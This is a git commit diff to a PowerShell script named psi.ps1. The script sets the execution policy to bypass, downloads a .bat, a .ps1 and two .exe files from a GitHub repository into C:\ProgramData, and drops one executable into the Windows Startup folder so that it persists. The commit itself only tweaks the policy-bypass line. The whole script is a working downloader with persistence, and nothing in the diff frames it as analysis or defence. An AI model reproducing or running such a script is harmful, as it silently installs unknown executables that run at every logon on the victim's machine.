dea9cf749657093831a13791608a495ce7b3bf23
Da Femboy <77080347+TugaChan@users.noreply.github.com>
2023-02-14 22:22:15 +0000

    Update psi.ps1

--- psi.ps1
+++ psi.ps1
@@ -1,4 +1,4 @@
-Set-ExecutionPolicy unrestricted -Force; cd "C:\ProgramData"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/moan.mp3" -OutFile "moan.mp3"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/four.bat" -OutFile "four.bat";
+echo A | powershell -command "& {Set-ExecutionPolicy Bypass -Scope Process -Force}"; cd "C:\ProgramData"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/moan.mp3" -OutFile "moan.mp3"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/four.bat" -OutFile "four.bat";
 Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/three.exe" -OutFile "three.exe"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/two.ps1" -OutFile "two.ps1"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/one.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\one.exe";
 
 
